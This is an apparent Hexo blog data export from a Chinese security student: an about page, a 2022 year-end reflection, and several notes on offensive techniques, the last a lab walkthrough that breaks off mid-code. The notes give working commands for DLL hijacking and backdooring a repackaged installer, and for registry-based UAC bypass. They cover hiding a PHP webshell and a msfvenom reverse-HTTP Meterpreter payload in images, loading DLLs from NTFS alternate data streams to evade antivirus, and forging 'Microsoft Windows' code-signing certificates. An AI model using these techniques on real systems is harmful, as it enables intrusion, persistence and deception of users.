{"meta":{"title":"J47erry'S BLOG","subtitle":"杰歪","description":"什么都想尝试的平凡小孩儿","author":"J47erry","url":"https://J47erry.github.io","root":"/"},"pages":[{"title":"about","date":"2022-05-22T10:19:17.000Z","updated":"2023-03-05T15:18:40.332Z","comments":false,"path":"about/index.html","permalink":"https://j47erry.github.io/about/index.html","excerpt":"","text":"√ 你好哇，这里是杰歪。 √ 普通本科大三在读。 √ 一个对世界好奇，什么都想尝试的小皮孩儿。 √ 喜欢一个人旅行、阅读、滑板、骑行的社恐人儿。 √ 网络安全爱好者。 √ 找我玩：1097623335（QQ）。"}],"posts":[{"title":"#回首2022：也无风雨也无晴","slug":"回首2022：也无风雨也无晴","date":"2022-12-31T13:13:00.000Z","updated":"2023-03-03T13:14:35.820Z","comments":true,"path":"2022/12/31/回首2022：也无风雨也无晴/","link":"","permalink":"https://j47erry.github.io/2022/12/31/%E5%9B%9E%E9%A6%962022%EF%BC%9A%E4%B9%9F%E6%97%A0%E9%A3%8E%E9%9B%A8%E4%B9%9F%E6%97%A0%E6%99%B4/","excerpt":"","text":"回首2022：也无风雨也无晴从去年写了年度总结开始，就觉得每一年对自己进行一个反思和思考很有意义。但今年是流水账，想到哪写哪吧哈哈哈哈。 回顾一整年，自身原因加上环境原因，使得焦虑作为主旋律贯穿始终，但是更多的还是幸运加持。 还是先列举一下今年的月份纪（印象深刻的月份发生的事情）： 123456一月：开始学习六月：面试、实习七月：工作、认识朋友八月：学技术、做一些疯狂的事九月：回学校学习十二月：旅游 写这篇的时候已经过完年了（emmm我拖延了。。。），最开始确定这一年的基调的时候，总感觉过的很焦虑很匆忙，其实，现在回过头看看，这一年这一年的暑假应该算是成年后的我在自己决定下过的最刺激的一年了。 从哪里开始写起呢？ 是从开头一二月份不分昼夜的学习，每天做梦脑袋里面都是是安全安全开始呢？ 还是从三四月开始投简历，从磕磕巴巴跟面试官说话到和面试官谈笑风生开始呢？ 亦或是从六七月入职实习，学习实战经验，认识大牛前辈，在大牛前辈面前分享自己的产出开始呢？ 更甚是从八九月份认识同事，一起做些年轻的疯狂的事儿，一起疯狂熬夜通宵，一起加班完成项目开始呢？ 还是从回归学校后，度过疫情最严重的时候，并在突然大环境放开的情况下，一边在外面跑毒一边在外面旅游开始呢？ ············· 好像没办法开始，我总觉得文字无法用来概括我的2022年，不论什么文字，都很苍白无力，都无法写出当时当下的心情。想用我匮乏的语言形容一下，但是删删又改改，还是找不到合适的词语，那种心情是独一无二的，是无与伦比的。 概括一下我在2022年的收获，我想大概是下面这样： 在焦虑中思考与成长 在幸运中自由与恣意 这一年的焦略作为主旋律，一直在我脑海里，时时刻刻绷着我。 在开始入门学习安全的时候，会怕自己付出没有回报，会焦虑；在投简历的时候，害怕自己简历太空白，会焦虑；在面试的时候，社恐，加上害怕技术面，会焦虑；在入职的时候，第一次进入社会，会焦虑；在做技术分享的时候，害怕技术在实习生中垫底，会焦虑；在完成项目的时候，害怕完成的不尽人意，会焦虑；在下班回去的时候，只有自已一个人在陌生的城市的时候，会焦虑······· 但现在回首向来”焦虑“处，也无风雨也无晴。以现在的心态回看这一年的焦虑，就是嘎嘎干！干就完事了。毕竟，接受一切的可能，允许一切的发生，不是嘛？ 这一年的更多的是幸运。其实，幸运都很显而易见了，上面的所有所有的焦虑都在幸运的加持下灰飞烟灭，在幸运的帮助下，完成了自我鞭策和进步。当然了，最最最幸运的是认识几位学长学姐，在她们的帮助下，在工作上完成超额工作，在生活上适应一个人的生活和陌生的工作的环境（她们的帮助不止这个，对我来说，是可以单独写一篇满满当当文章都说不尽的程度）。并且，到现在为止，也一直有着联系，也会见面，也会一起出去玩。 好了，借用一句话，总结一下吧。 尽管曲径辗转的生活每个瞬间都未知，但回看这一年，轻舟已过万重山，过山过桥过遗憾。 仅用以上1160个字致敬我这丰富多彩的2022年。 永远热血赴山海","categories":[{"name":"总结","slug":"总结","permalink":"https://j47erry.github.io/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"年度总结","slug":"年度总结","permalink":"https://j47erry.github.io/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"}],"author":"J47erry"},{"title":"#Dll劫持初体验","slug":"Dll劫持初体验","date":"2022-12-10T14:18:00.000Z","updated":"2023-03-05T14:47:30.562Z","comments":true,"path":"2022/12/10/Dll劫持初体验/","link":"","permalink":"https://j47erry.github.io/2022/12/10/Dll%E5%8A%AB%E6%8C%81%E5%88%9D%E4%BD%93%E9%AA%8C/","excerpt":"","text":"Dll劫持初体验DLL：动态链接库。DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于促进代码重用和内存的有效使用。dll文件和exe文件一样都是PE文件。 为什么可以dll劫持主要是因为Windows的资源共享机制。为了尽可能多得安排资源共享，微软建议多个应用程序共享的任何模块应该放在Windows的系统目录中，如kernel32.dll，这样能够方便找到。但是随着时间的推移，安装程序会用旧文件或者未向后兼容的新文件来替换系统目录下的文件，这样会使一些其他的应用程序无法正确执行，因此，微软改变了策略，建议应用程序将所有文件放到自己的目录中去，而不要去碰系统目录下的任何东西。 为了提供这样的功能，在Window2000开始，微软加了一个特性，强制操作系统的加载程序首先从应用程序目录中加载模块，只有当加载程序无法在应用程序目录中找到文件，才搜索其他目录。利用系统的这个特性，就可以使应用程序强制加载我们指定的DLL做一些特殊的工作。 什么是dll劫持如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，进而持久化控制。 由于 输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索 DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在 Windows系统目录中查找，最后是在 环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的 输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持。 12341.进程装载DLL。2.进程卸载DLL。3.DLL在被装载之后创建新线程。4.DLL在被装载之后线程被终止。 dll文件的加载顺序一、Windows XP SP2之前 Windows查找DLL的目录以及对应的顺序： 1234561. 进程对应的应用程序所在目录；2. 当前目录（Current Directory）；3. 系统目录（通过 GetSystemDirectory 获取）；4. 16位系统目录；5. Windows目录（通过 GetWindowsDirectory 获取）；6. PATH环境变量中的各个目录； 例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。 二、在Windows xp sp2之后 Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）： 默认注册表为： 1HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode， //其键值为1 dll文件加载顺序： 1234561. 进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；2. 系统目录（即%windir%system32）；3. 16位系统目录（即%windir%system）；4. Windows目录（即%windir%）；5. 当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；6. PATH环境变量中的各个目录； 三、Windows7以上 系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置： 1计算机\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\KnownDLLs 根据dll文件的路径，去注册表里面找。 但是不管是哪种情况，第一个搜索的肯定是应用程序的所在目录，这样就有机会让应用程序去加载我们的DLL。如果这个DLL和系统目录下的某个DLL同名，导出表也相同，功能就是加载系统目录下的那个DLL，并且将导出表转发到那个真实的DLL。这时DLL劫持就发生了。可以看出，构造一个符合上面要求的DLL，再将其放在可执行文件的目录即可轻松实现DLL劫持了。 dll劫持产生条件12341.dll能否被劫持： 不在&#x27;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs&#x27;注册表中2.其dll是EXE程序首先加载的DLL，而不是依赖其他DLL加载的。3.DLL确实被加载进内存中 判断dll是否可以被劫持的判断方法查看dll是否存在于“KnownDlls”中 手动方法把程序单独放到一个文件夹中，这种报错的话，就emm ProcessExplorer给出官方下载地址 1https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer ProcessMonitor1下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon 火绒剑 到这里来对比 自动化工具1.Ratter1下载地址:https://github.com/sensepost/rattler/releases 应该是我加载文件的原因，没找到一个可以利用dll劫持的，现在的防护也做得比较好 2.DLL Hijack Auditor自行百度下载 3.ChkDllHijack1下载链接：https://github.com/anhkgg/anhkgg-tools 待验证的dll列表可以用前面提到的微软自带的工具导出到txt文档，直接复制就可以。 实现dll劫持这里在我的虚拟机中测试 我比较菜，现在还不会动手写dll文件，这里就使用工具来生成dll文件。 首先明确我们的需求： 12341、构造一个与系统目录下LPK.DLL一样的导出表2、加载系统目录下的LPK.DLL3、将导出函数转发到系统目录下的LPK.DLL上4、在初始化函数中加入我们要执行的代码 这里使用t00ls的lpk提权辅助 设置触发dll劫持的热键。 放到exe程序的相同目录里，只要对方重启该exe程序，dll文件就会被触发，我这里放到了phpstudy目录里。 如果没有第三方软件的话，也可以放到IIS mysql数据库里。 远程连接输入热键和密码，成功实现劫持。 开始漫游 看下当前权限，system 这里我只是实现了第三方软件的dll劫持，还可以劫持系统的dll，手法多种多样，下面介绍几种其他的方式生成dll文件。 1.msf生成1msfvenom -p windows/exec CMD = notepad.exe EXITFUNC=thread -f dll -o notepad.dll 这种方法显而易见，不免杀，而且免杀很难做。 2.InjectProc注入1下载地址：https://github.com/secrary/InjectProc/releases/tag/0.1 这个工具利用的是进程注入，链接中也有演示视频，这里就不演示了。 3.CS + 注入工具先生成一段shellcode，再利用工具注入 ring3层的dll注入 这个 会在当前目录下生成conf.inf 和 wwwcomw.dll 两个文件，体积也不太大。 然后需要将dll文件放到和准备劫持的exe同一目录中。这里我都放到了桌面。 首先将shellcode生成的dll函数导入到exe pe表中 将准备劫持的文件放到pe查看器中 在函数那里导入刚才生成的dll函数 但是我这里确始终不上线，不知道是系统原因还是劫持文件的原因，换了好几个exe文件都不得行。有知道的师傅可以告诉我一下。 4.利用NSIS默认向导脚本制作Windows安装包1 下载地址：https://nsis.sourceforge.io/Download NSIS只是一个打包安装包的软件，想要打包后上线的前提是第三步中的exe已经被注入可以上线。 准备一个exe文件（这里应该是第三步中注入好的exe文件，因为我第三步中选的exe没有图标，所以这里换一个exe） 利用资源树提取ico图标 准备打包 选择编译脚本 开始安装 应用程序默认安装目录最好，为了防止和原来安装的冲突，应用名后面加个1 还有下面的授权文件，路径必须存在 ，不然后面编译时会报错。(呜呜呜 这里浪费了太多时间) 第五步先把默认的两个项目删掉，然后新建项目 emmm 干得漂亮 换个安装包试试 换了个爱奇艺，成功编译 对比一下可以看到 体积只增加了一点点 少了数字签名 一般人的话应该不会不会注意到，这个时候配合注入dll 可以成功实现留后门。 总结：dll可以利用的点很多，思路很多很广，可以劫持，注入，提权，白加黑、自己编写dll加载shellcode等等。 有哪里不对的大佬们可以指出来 参考链接： 123https://www.cnblogs.com/bmjoker/p/11031238.htmlhttps://blog.csdn.net/gamma_lab/article/details/119451934https://zhuanlan.zhihu.com/p/339329861","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://j47erry.github.io/tags/%E6%8F%90%E6%9D%83/"}],"author":"J47erry"},{"title":"#Bypass UAC之初体验","slug":"Bypass-UAC之初体验","date":"2022-12-05T08:16:38.000Z","updated":"2022-12-05T08:16:10.301Z","comments":true,"path":"2022/12/05/Bypass-UAC之初体验/","link":"","permalink":"https://j47erry.github.io/2022/12/05/Bypass-UAC%E4%B9%8B%E5%88%9D%E4%BD%93%E9%AA%8C/","excerpt":"","text":"0x01 UAC白名单首先，如果父进程和子进程之间存在关系，即子进程从父进程中继承访问令牌，就可以绕过UAC，这是绕过UAC基础。 任何需要管理员访问令牌的程序都必须征得同意(即UAC弹窗)，但是存在一些具有白名单机制的系统程序，这些程序将会自动提升到管理员权限进行运行。因此，可以通过这些白名单来bypass UAC，以便获得高权限。 微软官方提供的Sigcheck和Strings工具，可以用来寻找白名单程序。 String： &#x2F;&#x2F;可以查找所有白名单程序 1strings.exe /accepteula -s C:\\Windows\\System32\\*.exe | findstr /i &quot;autoElevate&quot; Sigcheck： &#x2F;&#x2F;可以对特定的程序查询是否为白名单程序 1sigcheck.exe /accepteula -m C:\\Windows\\System32\\ComputerDefaults.exe 原理： 白名单程序拥有一个共同的特性，就是autoElevate属性的值为true。 以CompMgmtLauncher.exe为例测试分析，因为它是白名单程序，所以运行时自动提升到高权限，没有uac弹窗。 使用process monitor监视进程： 找到shell的注册表，通常情况下，以“shell\\open\\command”命名的注册表中存储的可能就是可执行文件的路径，程序通过regopenkey&#x2F;regquerykey其中的键值并运行相应的可执行文件。 修改键值对： 123reg add “HKCU\\Software\\Classes\\mscfile\\shell\\open\\command&quot; /d &quot;C:\\Windows\\System32\\cmd.exe&quot; /freg add “HKCU\\Software\\Classes\\mscfile\\shell\\open\\command&quot; /v DelegateExecute /t REG_SZ /d &quot;C:\\Windows\\System32\\cmd.exe&quot; /f （尝试了一下，直接在Editor修改并且不新建，也能成功） 运行之后，弹出cmd弹窗，可以完成新建用户的高权限操作，并且没有UAC弹窗： 0x02 DLL劫持当应用程序启动时，相应的DLL文件就会被加载到程序进程的内存空间， 如果没有指定DLL的绝对路径，那么程序会以特定的顺序依次搜索待加载的DLL， SafeDllSearchMode： 1程序安装目录——&gt;系统目录（C:\\Windows\\System32）——&gt;16位系统目录（C:\\Windows\\System）——&gt;Windows目录（C:\\Windows）——&gt;当前工作目录——&gt;PATH环境变量中列出的各目录 原理： 如果将同名的恶意DLL文件放在合法DLL文件所在路径之前的搜索位置，当应用程序搜索DLL时，就会以恶意DLL代替合法的DLL来加载。 前提： 对上诉目录有写入权限 恶意DLL需要与原始DLL拥有相同的导出表函数 System32目录下易受到DLL劫持攻击的所有可执行文件： https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv 白名单文件自动获取高权限需要满足三个条件（缺一不可）： Manifest中autoElevate属性字段为true。 执行可执行文件的签名。 位于系统可信任目录。 首先，构造第3个条件，系统在检查可信任目录时，相关函数会自动去掉可执行文件路劲中的空格，因此可以模拟可信任目录，（测试的可执行文件是WinSAT.exe） 123md &quot;\\\\?\\C:\\Windows &quot;md &quot;\\\\?\\C:\\Windows \\System32&quot;copy C:\\Windows\\System32\\WinSAT.exe &quot;\\\\?\\C:\\Windows \\System32\\WinSAT.exe&quot; 查看C盘就可以发现有两个Windows文件，其中有个文件夹是最近的创建时间（我虚拟机刚好更新了，所以看起来两个文件夹时间相差不多。。。）： 使用process Monitor监控一下exe调用的DLL： 可以追踪到，程序在尝试调用伪造的Windows文件夹，但是都失败了， 尝试伪造一个WINMM.dll，借用工具AheadLib工具获取dll文件导出表函数，并自动生成C++函数， 在DLLMAIN函数中添加测试命令， 编译生成dll文件， 放入文件夹，点击报错， 去把缺少的dll文件复制过去，成功bypass UAC运行， 0x03 利用工具bypass UACMSF： 里面很多自带模块可以使用， 获取会话后，提权失败，（测试过程被杀掉断掉连接了。。。） 直接设置会话就行了，可直接提升至system权限。 UACME： 专用于绕过Windows UAC的开源项目， 工具使用很简单，手撕代码分析原理还是太菜了，，， 参考文章： 1234567在Windows中劫持DLL————https://cloud.tencent.com/developer/article/1850848BypassUAC————https://www.cnblogs.com/cxccc/p/12732976.html“FILELESS” UAC BYPASS USING EVENTVWR.EXE AND REGISTRY HIJACKING————https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/Exploring Windows UAC Bypasses: Techniques and Detection Strategies————https://www-elastic-co.translate.goog/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies?_x_tr_sl=en&amp;_x_tr_tl=zh-CN&amp;_x_tr_hl=zh-CN&amp;_x_tr_pto=sc","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://j47erry.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"#隐写过360、火绒","slug":"隐写术","date":"2022-11-24T14:01:38.000Z","updated":"2022-11-25T08:56:55.931Z","comments":true,"path":"2022/11/24/隐写术/","link":"","permalink":"https://j47erry.github.io/2022/11/24/%E9%9A%90%E5%86%99%E6%9C%AF/","excerpt":"","text":"隐写过360、火绒一些简单的隐写demo过静态免杀。 0x00 图种利用copy命令，可以将两个文件以二进制方式连接起来，很显然，也可以将木马插入到图片里面，尝试隐写。 1copy/b C:\\...\\...\\Desktop\\OIP-A.png + C:\\...\\...\\Desktop\\shell.php 123.png 生成123.png图片里面就会存在连接密码。 通过360和火绒查杀，并没有检查出病毒。 上传看看。（感觉VT结果怪怪的。。。） 换成简单的一句话木马，试试。 原理是在图片中，是有结束符的，16进制就是FF D9，而图片查看器会自动忽视结束符之后的内容，所以图片会正常显示，利用winhex就可以看到后续的内容。 看到binwalk会对图片进行检查，测试发现，如果单纯的图种（png+zip），会被检测出。 如果只是恶意代码，并不能直接检测出来。 提一嘴，jpg和png方式对文件压缩不同，jpg可能会使文件损坏。 0x01 LSB修改图种是在图片数据后面增添代码，LSB隐写就是直接修改有效最低位，完成数据隐藏。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from PIL import Image as imimport re replace_reg = re.compile(r&#x27;[1|0]$&#x27;) #替换最后一位的数据，source是被替换数据，target是目标数据，就是batarget放到source最后一位def repLstBit(source,target): return replace_reg.sub(target,source) #运行结果：&#x27;123X&#x27;print(repLstBit(&quot;111110&quot;,&quot;1&quot;)) #字符串转换二进制，不够八位的话补齐8位def encode(s): return &#x27;&#x27;.join(bin(ord(c)).replace(&#x27;0b&#x27;,&#x27;&#x27;).rjust(8,&#x27;0&#x27;) for c in s) #切割从图像中收集到的数据，就是把载密图像的对应最后一位提取出来之后需要进行切割def cut_text(text,lenth): textArr = re.findall(&#x27;.&#123;&#x27;+str(lenth)+&#x27;&#125;&#x27;,text) tempStr = text[(len(textArr) * lenth):] if len(tempStr)!=0: textArr.append(text[(len(textArr)*lenth):]) return textArr #二进制转换成字符串，看上面切割方法的注释即可理解该方法存在的意义def decode(s): bitArr = cut_text(s,8) return &quot;&quot;.join(chr(int(i,2)) for i in bitArr) #读取宿主图像和要写入的信息生成载密图像。if __name__ == &#x27;__main__&#x27;: img = im.open(&quot;C:/Users/admin/Desktop/OIP-C.png&quot;) width = img.size[0] height = img.size[1] hideInfo = &quot;&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;&quot; hideBitArr = encode(hideInfo) count = 0 bitInfoLen = len(hideBitArr) print(hideBitArr) for i in range(width): for j in range(height): if count == bitInfoLen: break; pixel = img.getpixel((i,j)); print(pixel[0]) sourceBit = bin(pixel[0])[2:] print(sourceBit) rspBit = int(repLstBit(sourceBit,hideBitArr[count]),2) count += 1 img.putpixel((i,j),(rspBit,rspBit,rspBit)) img.save(&quot;C:/Users/admin/Desktop/1.png&quot;) 完成信息写入。 本地运行，不会报毒，不知道上传能不能正常连接使用。 试试隐写shellcode。 msf生成： 1msfvenom -p windows/x64/meterpreter/reverse_http lhost=0.0.0.0 lport=1111 -fpsh-reflection&gt;12.ps1 图片和ps1文件放在同一目录下： 123Set-ExecutionPolicy Unrestricted -Scope CurrentUserImport-Module .\\Invoke-PSimage.ps1Invoke-PSImage -Script .\\12.ps1 -Image .\\OIP-A.png -Out .\\OIP-C.jpg -Web 将生成图片上传到网站进行加载，本地运行生成的shellcode，360、火绒不报毒。 0x02 vmdk隐写vmdk作为虚拟硬盘，文件大小上限为2GB，存在跟物理硬盘一样的分区和扇区中类似的填充区域，因此，就可以把数据藏在该区域进行隐写。 利用winhex（不知道为啥打不开vmdk文件。。）或者010 Editor分析填充区域，确定嵌入的地方。整个虚拟磁盘中存在大量的、聚集在一起的填充区域，从虚拟文件末尾开始（EOF文件标识符）逐渐向上查找，越到文件末尾填充区域就越多。 填充方式可以有两种，直接用winhex进行替换，或者用vmdk文件编辑工具进行修改。这里选择编辑工具。 1dsfi C:\\Users\\10976\\Desktop\\1.vmdk 36864 36864 C:\\Users\\10976\\Desktop\\12.txt 重新打开vmdk文件，信息成功写入。 上传看看。 在vmdk文件填充区域隐藏信息可以避免和图种一样增加文件大小，而且修改过的vmdk也可以正常运行，但是，虚拟磁盘被长期运行，隐藏数据可能会被重新覆盖，同时，vmdk文件太大了，不方便下载或者在网络中传输。 同原理，PDF、DOC等文档也可以通过添加文件头进行数据隐藏，但是这种文件目标太大，感觉实战上传不太现实。。。 0x03 交换数据流windows NTFS文件系统的交换数据流（ADS）也可以用来数据隐藏。 ADS数据流文件作为系统中的隐身人在渗透中作用还是很大，这里主要说免杀的应用。 简单认识一下，创建交换数据流， 1notepad visiable.txt:hidden.txt 查看创建的文件，字节为0，数据被隐藏， ADS数据流文件存在形式就有两种：一是依赖宿主文件，二是单独ADS文件。前者ADS一般很难清理，所以将dll文件写入该文件内测试免杀再好不过了。 1type 123.dll &gt; 111.txt:ms 可以看见执行完命令的txt文件并没有改变， 用360、火绒进行查杀，基本不报毒，不过，用def一扫，就没了。。。（毕竟dddd） （测试过程发现一点，如果寄主文件目录发生变化，ADS数据流文件自动消失） 运行dll： 1regsvr32 111.txt:ms 看到有说360会对这种dll文件进行动态查杀，但是我本地测试没问题，不太懂了，不过，ADS在WEB安全中的利用值得学习研究一下。 0x04 总结总而言之，言而总之，数据隐藏的范围很大，包括但不限于还可以在图片的载体中、在双图中、在TCP中、可执行文件中、TTL字段中等等等进行隐藏，可以进一步学习。目前，接触隐写术，只是觉得好玩哈哈哈。 12345678910参考博客：shellcode隐写RGB过火绒、360————https://0range-x.github.io/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/数据隐藏技术————http://tttang.com/archive/1181/#toc_0x00图片隐写术总结————https://blog.csdn.net/riba2534/article/details/70544076Windows ADS在渗透测试中的妙用————https://www.freebuf.com/articles/terminal/195721.html","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"免杀","slug":"免杀","permalink":"https://j47erry.github.io/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"#记一次多层内网渗透","slug":"记一次多层内网打靶","date":"2022-11-15T07:45:00.000Z","updated":"2022-11-25T08:57:27.225Z","comments":true,"path":"2022/11/15/记一次多层内网打靶/","link":"","permalink":"https://j47erry.github.io/2022/11/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6/","excerpt":"","text":"记一次多层内网渗透好久之前的一次很简单内网靶场的打靶。 ip扫描 查看开放的端口服务，发现存在web服务的80端口。 进行访问web网页，是thinkphp框架，可以进行工具盲打。 写入一句话木马。然后访问写入的木马，结果发现木马post被过滤。 将一句话木马进行base64编码，尝试绕过。 木马写入，进行蚁剑连接。 连接以后，执行终端发现只是普通权限。利用kali生成木马进行反弹上线。 设置msf监听 1234567891011msfconsoleuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 0.0.0.0 (在不知道网络和主机的时候，可以使用表示)set lport 6666exploit 进行监听后，在蚁剑终端对elf文件进行赋权，然后启动木马，回显上线。 在第一台内网机器里，查看网段，发现该机器是双网卡。 添加22网段的路由,然后查看路由添加情况。 挂起socks代理。 1234567891011search socks use auxiliary/server/socks_proxyshow optionsset VERSION 4aset SRVHOST 10.65.203.xxexploit 挂起会话，然后查看ip地址arp -a。 然后进行第二台机器的内网信息端口收集。 发现第二台机器也存在80的web服务，通过代理去访问。 翻看web源代码，发现注入点。（程序员神操作） 然后工具跑出后台密码，进行登录。 通过搜索引擎找到后台登录目录，找到模板，插入一句话木马的代码 然后用蚁剑进行连接，然后msf生成木马，然后监听。 123456789use exploit/multi/handlerset payload linux/x64/meterpreter/bind_tcpset rhost 192.168.22.129set lport 12345exploit 然后赋权，回弹上线。 （我的蚁剑有病，实在连接不上了。） 扫了一下后面主机，开放了445端口，存在永恒之蓝漏洞，当时只知道直接用exp打，就没写下去。","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://j47erry.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"#CS 分离免杀上线","slug":"CS 分离免杀上线","date":"2022-10-07T11:20:00.000Z","updated":"2023-03-07T11:55:16.165Z","comments":true,"path":"2022/10/07/CS 分离免杀上线/","link":"","permalink":"https://j47erry.github.io/2022/10/07/CS%20%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/","excerpt":"","text":"CS 分离免杀上线首先cs上生成raw格式的木马，然后使用加载器加载 1下载地址：https://github.com/knownsec/shellcodeloader 火绒正常过，但是被360杀了 上线后的权限直接是system 下面尝试下加壳 1下载地址：http://www.pc6.com/softview/SoftView_18439.html?_t_t_t=0.4545903904363513 加壳后体积小了一点 再尝试添加下数字签名 1工具下载地址：https://github.com/3gstudent/signtools 1.检查程序中是否有证书 管理员权限运行cmd 1sigcheck.exe -q C:\\Users\\0range\\Desktop\\loader.exe 2.使用makecert命令制作证书，sv-私钥文件名，ss-主题的证书存储名称，n-证书颁发对象，r-证书存储位置，输入私钥密码。 123makecert.exe -n &quot;CN=Microsoft Windows&quot; -r -sv system.pvk system.cerCert2Spc.exe system.cer system.spcpvk2pfx.exe -pvk system.pvk -pi 123456 -spc system.spc -pfx system.pfx -f 3.注册证书与签发证书 12CertMgr.Exe -add -c system.cer -s -r localmachine rsigntool.exe sign /f system.pfx /p 123456 C:\\Users\\0range\\Desktop\\loader.exe 这里还是没有骗过360，只过掉了静态扫描 给powershell脚本上签名 生成证书文件 123makecert -n &quot;CN=Microsoft Windows&quot; -r -eku 1.3.6.1.5.5.7.3.3 -sv certtest.pvk certtest.cercert2spc certtest.cer certtest.spcpvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f 给脚本签名 123powershell$cert = Get-PfxCertificate certtest.pfxSet-AuthenticodeSignature -Filepath C:\\Users\\0range\\Desktop\\payload.ps1 -Cert $cert 这火绒都杀。。。 总结毕竟工具放出来这么长时间了，而且不需要什么技术含量，纯粹傻瓜式操作，免杀效果可见一斑，但不妨稍加改造，自己造轮子（太菜了，我不会。。。），效果应该会更好。 123参考链接：https://www.cnblogs.com/LyShark/p/11347609.html","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"免杀","slug":"免杀","permalink":"https://j47erry.github.io/tags/%E5%85%8D%E6%9D%80/"}],"author":"J47erry"},{"title":"#Medium_Socialnetwork(靶场)","slug":"Medium-Socialnetwork-靶场","date":"2022-08-05T15:07:00.000Z","updated":"2023-03-05T15:12:12.370Z","comments":true,"path":"2022/08/05/Medium-Socialnetwork-靶场/","link":"","permalink":"https://j47erry.github.io/2022/08/05/Medium-Socialnetwork-%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"Medium_Socialnetwork（靶场）信息收集阶段进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描 主机发现阶段发现同一网段下有三个资产，第一个大概率是网关，第二个经验证是物理机的地址，猜测第三个地址为靶机地址，接下来要对靶机进行端口的扫描，以发现靶机上运行的服务 使用nmap进行端口扫描，第一步是对目标进行端口的发现 发现靶机上开了两个端口，其中一个是22端口（SSH服务），另一个是非常见端口5000。针对SSH服务常见的攻击手法是弱口令、暴破或者利用一些历史版本漏洞进行突破，目前收集的信息尚少。可以对端口进行版本的发现，看看各个端口上跑的是什么服务。 通过版本发现可以得到的信息是：系统为Ubuntu，22端口上跑的是SSH服务，5000端口上跑的是http服务，其中的Werkzeug是一个WSGI的工具包，也可以作为Web框架的底层库，基于Python2来实现。使用searchsploit 寻找关于 Werkzeug 的漏洞，可以找到两三个，均利用不成功。 整理一下目前得到的可用信息：其中SSH可以考虑暴破用户名密码，5000端口上跑了一个网站，可以访问寻找突破口，其中的框架是基于Python来实现的，若有代码执行，可以考虑用Python脚本来执行反弹shell。 通过Web漏洞拿shell尝试访问目标的5000端口，发现是一个交互网站 网站有输入框，但是信息提示 ”绝对安全“， 突破可能性不大。但还是尝试插入了一下XSS payload 1&lt;script&gt;alert(&#x27;justtry&#x27;)&lt;/script&gt; 发现还是原样输出到页面，证明该输入框不是突破点，通过查看源代码也找不到什么其他信息。 尝试收集更多的信息，在网站下进行目录扫描，看有没有管理后台或者敏感信息泄露，这里使用的是dirsearch工具 发现 有一个 &#x2F;admin 路径，尝试访问，页面有代码测试功能，可尝试代码执行。考虑到框架是基于Python 实现的，可以找 Python 的 反弹shell 代码。 在CSDN上找到一段现成的可以直接拿来用的代码 1234567import 